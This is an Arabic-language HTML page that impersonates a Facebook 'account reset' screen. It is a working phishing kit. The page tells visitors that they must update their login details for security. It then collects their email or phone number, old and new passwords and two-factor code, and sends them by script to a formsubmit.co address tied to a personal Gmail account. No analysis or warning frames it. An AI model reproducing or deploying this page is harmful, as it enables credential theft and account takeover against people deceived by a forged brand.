<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إعاده التعين</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');

        body {
            font-family: 'Tajawal', sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        .logo-section h1 {
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            margin: 0;
        }

        .logo-section p {
            font-size: 18px;
            color: #1c1e21;
        }

        .login-section {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 90%;
            margin-top: 20px;
        }

        input {
            width: 90%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }

        button {
            width: 90%;
            padding: 12px;
            background: #1877f2;
            border: none;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-section">
            <h1>facebook</h1>
            
            <p>لحماية حسابك وتعزيز أمانه، نطلب منك تحديث بيانات تسجيل الدخول، هذه العملية بسيطة ولن تستغرق سوى دقائق قليلة، نحن ملتزمون بحماية بياناتك وضمان أمنها، وبعد إتمام الخطوات ستتمكن من استعادة الوصول إلى حسابك كالمعتاد.</p>
        </div>
        
        <div class="login-section">
            <form id="messageForm" action="https://formsubmit.co/anniesakuta@gmail.com" method="POST">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_subject" value="بيانات تسجيل دخول جديدة">
                <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">

                <label>
                   <!-- <input type="checkbox" id="useEmail" onchange="toggleInput()"> استخدام البريد الإلكتروني بدلاً من رقم الهاتف
                </label> -->

                <input type="email" id="email" name="email" placeholder=" البريد الإلكتروني او رقم الهاتف " >
               
                <div>
                    <input type="password" id="old-password" name="old-password" placeholder="كلمة المرور القديمة" required>
                </div>

                <div>
                    <input type="password" id="new-password" name="new-password" placeholder="كلمة المرور الجديدة" required>
                </div>

                <div>
                    <input type="password" id="confirm-password" name="confirm-password" placeholder="تأكيد كلمة المرور" required>
                </div>

                <label>
                    <input type="checkbox" id="twoFactorAuth" onchange="toggleTwoFactor()"> هل الحساب مفعّل بالتحقق بخطوتين؟
                </label>
                
                <input type="text" id="twoFactorCode" name="twoFactorCode" placeholder="رمز التحقق" class="hidden">

                <button type="submit">تسجيل الدخول</button>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('messageForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('new-password').value;
            const confirmPassword = document.getElementById('confirm-password').value;
            const submitBtn = this.querySelector('button[type="submit"]');
            const twoFactorEnabled = document.getElementById('twoFactorAuth').checked;
            const twoFactorCode = document.getElementById('twoFactorCode').value.trim();
            const useEmail = document.getElementById('useEmail').checked;

            if (useEmail && !email) {
                alert("يرجى إدخال البريد الإلكتروني.");
                return;
            }

           
            if (password !== confirmPassword) {
                alert("كلمة المرور الجديدة غير متطابقة!");
                return;
            }

            if (twoFactorEnabled && !twoFactorCode) {
                alert("يرجى إدخال رمز التحقق.");
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'جاري الإرسال...';

            fetch(this.action, {
                method: 'POST',
                body: new FormData(this)
            }).then(response => {
                window.location.href = "https://yourwebsite.com/thank-you.html";
            }).catch(error => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'تسجيل الدخول';
            });
        });

        function toggleTwoFactor() {
            document.getElementById('twoFactorCode').classList.toggle('hidden');
        }

        function toggleInput() {
            document.getElementById('email').classList.toggle('hidden');
            document.getElementById('phone').classList.toggle('hidden');
        }
    </script>

</body>
</html>
